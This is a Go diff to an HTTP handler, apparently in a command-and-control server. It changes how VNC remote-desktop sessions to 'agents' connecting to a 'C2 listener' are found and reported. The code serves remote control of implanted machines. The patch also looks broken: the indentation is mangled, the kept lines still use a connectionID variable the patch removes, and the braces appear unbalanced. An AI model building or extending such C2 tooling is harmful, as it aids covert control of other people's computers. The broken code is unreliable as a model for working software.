@@ -451,13 +451,39 @@ func main() {
 			request.FPS = 30
 		}
 
-		// Try to initiate VNC connection through VNC service
-		if vncService := listenerService.GetVNCService(); vncService != nil {
-			connectionID, err := vncService.InitiateConnection(request.AgentID, request.Resolution, request.FPS)
-			if err != nil {
-				http.Error(w, fmt.Sprintf("Failed to initiate VNC connection: %v", err), http.StatusInternalServerError)
-				return
-			}
+// VNC connections are initiated by agents connecting to the C2 listener
+// The VNC service handles incoming connections automatically
+if vncService := listenerService.GetVNCService(); vncService != nil {
+    // Get current active connections to see if the agent is already connected
+    activeConnections := vncService.GetActiveConnections()
+    
+    // Check if we already have a connection from this agent
+    var existingConnectionID string
+    for _, conn := range activeConnections {
+        if agentIP, ok := conn["agent_ip"].(string); ok && strings.Contains(agentIP, request.AgentID) {
+            existingConnectionID = conn["id"].(string)
+            break
+        }
+    }
+    
+    if existingConnectionID != "" {
+        // Return existing connection info
+        w.Header().Set("Content-Type", "application/json")
+        json.NewEncoder(w).Encode(map[string]interface{}{
+            "success":       true,
+            "message":       "VNC connection already active",
+            "connection_id": existingConnectionID,
+        })
+    } else {
+        // No active connection - agent needs to connect
+        w.Header().Set("Content-Type", "application/json")
+        json.NewEncoder(w).Encode(map[string]interface{}{
+            "success": false,
+            "message": "No active VNC connection. Agent must connect to the C2 listener first.",
+        })
+    }
+    return
+}
 
 			w.Header().Set("Content-Type", "application/json")
 			json.NewEncoder(w).Encode(map[string]interface{}{
